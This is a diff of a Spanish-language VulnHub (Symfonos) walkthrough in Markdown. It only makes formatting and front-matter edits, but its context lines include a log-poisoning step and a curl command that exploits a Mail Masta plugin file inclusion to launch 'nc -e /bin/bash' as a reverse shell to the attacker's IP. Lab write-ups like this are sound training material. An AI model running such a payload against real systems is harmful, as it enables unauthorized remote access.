@@ -5,7 +5,7 @@ plataforma: "[[VulnHub]]"
 web:
 dificultad: Fácil
 os: Linux
-relacionados:
+linked:
   - "[[smbclient]]"
   - "[[smbmap]]"
   - "[[hydra]]"
@@ -138,7 +138,7 @@ Al ver el codigo fuente de `http://192.168.0.189/h3l105` me encuentro con que to
 
 	Ahora sí al cargar `http://symfonos.local/h3l105/` o nuevamente `http://192.168.0.189/h3l105` me encuentro con que la carga adecuadamente.
 
-___
+---
 
 ## Análisis de vulnerabilidades
 
@@ -246,7 +246,7 @@ Puedo intentar crear un log con código php para ver si es interpretado:
     ```
     Me responde: `250 2.0.0 Ok: queued as 09AC240873`
 
-___
+---
 ## Explotación de vulnerabilidades
 
 ### Ejecución remota de comandos
@@ -271,7 +271,7 @@ Al volver a revisar el log del mail veo el email pero no el contenido, sin embar
     curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e+/bin/bash+192.168.0.252+443"
     ```
 
-___
+---
 
 ## Escalada de privilegios
 
